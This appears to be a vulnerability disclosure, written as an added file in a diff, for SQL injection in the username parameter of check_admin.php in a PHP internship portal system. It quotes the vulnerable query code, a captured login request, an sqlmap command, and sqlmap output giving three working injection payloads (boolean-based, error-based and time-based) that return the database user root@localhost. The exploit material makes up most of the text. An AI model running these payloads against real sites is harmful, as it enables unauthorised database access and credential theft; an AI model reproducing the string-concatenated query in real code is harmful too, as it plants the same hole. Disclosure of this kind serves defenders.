@@ -1,0 +1,57 @@
+Internship Portal Management System - SQL Injection on (admin/check_admin.php username parameter) 
+
+Vendor Homepage:
+https://www.sourcecodester.com/php/11712/internship-portal-management-system.html 
+
+Version:V1.0
+
+Tested on: PHP, Apache, MySQL
+
+Affected Page:
+check_admin.php 
+On this page username parameter is vulnerable to SQL Injection Attack 
+
+Source Code(intern_sys/admin/check_admin.php):
+$username = $_POST['username'];
+$query = $conn->query("SELECT * FROM `admin` WHERE `username` = '$username' && `password` = '$password'") or die($conn->error);
+
+Proof of vulnerability(Verify using the sqlmap tool):
+Requests:
+POST /intern_sys/admin/check_admin.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Content-Length: 122
+Accept: */*
+Accept-Language: zh-CN,zh;q=0.9
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Cookie: PHPSESSID=bpfjr9o3euj8d6ognte8obmo85
+Origin: http:// localhost
+Referer: http:// localhost /intern_sys/admin/index.php
+X-Requested-With: XMLHttpRequest
+Accept-Encoding: gzip
+
+password=admin&username=admin
+
+-> sqlmap -r 1.txt(above request package) --batch --current-user -p username
+
+Output:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: password=admin&username=admin' AND 5543=5543 AND 'jTaV'='jTaV
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: password=admin&username=admin' AND GTID_SUBSET(CONCAT(0x7162707071,(SELECT (ELT(5222=5222,1))),0x717a706a71),5222) AND 'PmCB'='PmCB
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: password=admin&username=admin' AND (SELECT 2356 FROM (SELECT(SLEEP(5)))WFcl) AND 'CbIG'='CbIG
+---
+[07:07:42] [INFO] the back-end DBMS is MySQL
+web application technology: PHP 7.3.11, Apache 2.4.41
+back-end DBMS: MySQL >= 5.6
+[07:07:42] [INFO] fetching current user
+[07:07:42] [INFO] resumed: 'root@localhost'
+current user: 'root@localhost'
